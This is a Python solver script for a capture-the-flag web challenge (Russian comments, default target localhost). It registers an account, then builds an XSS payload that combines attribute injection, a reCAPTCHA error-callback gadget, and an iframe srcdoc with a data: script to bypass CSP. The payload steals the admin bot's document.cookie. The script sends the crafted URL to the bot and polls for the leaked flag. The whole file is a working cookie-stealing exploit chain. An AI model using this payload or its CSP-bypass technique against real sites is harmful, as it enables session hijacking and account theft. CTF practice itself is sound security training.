#!/usr/bin/env python3
import argparse
import re
import time
import uuid
from urllib.parse import quote

import requests


FLAG_RE = re.compile(r"(?:flag|CyberCTF)\{[^}]+\}")
VIEW_KEY_RE = re.compile(r"/views/([A-Za-z0-9_-]{8,64})")


def build_exploit_path(view_key: str) -> str:
    # Нагрузка преобразуется в значение, перезаписывающее атрибут `email`, а затем вставляется ​​с помощью метода jQuery `.html()`
    # Используем srcdoc + data: для байпаса CSP
    # Внутренний script остаётся в сущностях после одного раскодирования атрибута,
    # чтобы в srcdoc попал настоящий <script src="data:...">.
    injected_html = (
        "&lt;iframe srcdoc=&quot;"
        "&amp;lt;script src=&amp;quot;data:text/javascript,"
        f"fetch('/views/{view_key}?viewer='+encodeURIComponent(document.cookie))"
        "&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;"
        "&quot;&gt;&lt;/iframe&gt;"
    )

    firstname = f'{injected_html}" id=email>'
    lastname = 'x" class="g-recaptcha" data-sitekey="1337" data-error-callback="subscribereport">'

    qs = f"firstname={quote(firstname)}&lastname={quote(lastname)}&email=placeholder"
    return f"/story-lab?{qs}"


def create_idea(base_url: str, session: requests.Session) -> str:
    username = f"s{uuid.uuid4().hex[:10]}"
    password = uuid.uuid4().hex
    session.post(f"{base_url}/register", data={"username": username, "password": password}, timeout=10)
    login = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=10,
    )
    login.raise_for_status()
    session.post(
        f"{base_url}/suggest",
        data={"content": "Черновик для журнала просмотров."},
        timeout=10,
    )
    page = session.get(f"{base_url}/suggest/new", timeout=10)
    page.raise_for_status()
    match = VIEW_KEY_RE.search(page.text)
    if not match:
        raise RuntimeError("Could not find idea view key on /suggest/new")
    return match.group(1)


def send_to_bot(base_url: str, path: str, session: requests.Session) -> None:
    report_url = f"{base_url.rstrip('/')}/report"
    response = session.post(report_url, data={"url": path}, timeout=10)
    response.raise_for_status()
    print(f"[+] Report response: {response.text.strip()}")


def poll_flag(
    base_url: str, attempts: int, delay: float, view_key: str, session: requests.Session
) -> str:
    views_url = f"{base_url.rstrip('/')}/views/{view_key}"
    for i in range(1, attempts + 1):
        response = session.get(views_url, timeout=10)
        response.raise_for_status()
        match = FLAG_RE.search(response.text)
        if match:
            return match.group(0)
        print(f"[-] Flag not found yet ({i}/{attempts}), retrying...")
        time.sleep(delay)
    return ""


def main():
    parser = argparse.ArgumentParser(description="Solver for voting challenge")
    parser.add_argument("--base", default="http://localhost:5001", help="Base URL of target service")
    parser.add_argument("--attempts", type=int, default=20, help="How many times to poll idea views")
    parser.add_argument("--delay", type=float, default=1.5, help="Delay between polling attempts")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    session = requests.Session()
    view_key = create_idea(base, session)
    exploit_path = build_exploit_path(view_key)
    print(f"[+] Idea view key: {view_key}")
    print(f"[+] Generated exploit path:\n{exploit_path}\n")

    send_to_bot(base, exploit_path, session)
    flag = poll_flag(base, args.attempts, args.delay, view_key, session)

    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[!] Flag not found. Check if services are running and bot could reach payload URL.")


if __name__ == "__main__":
    main()
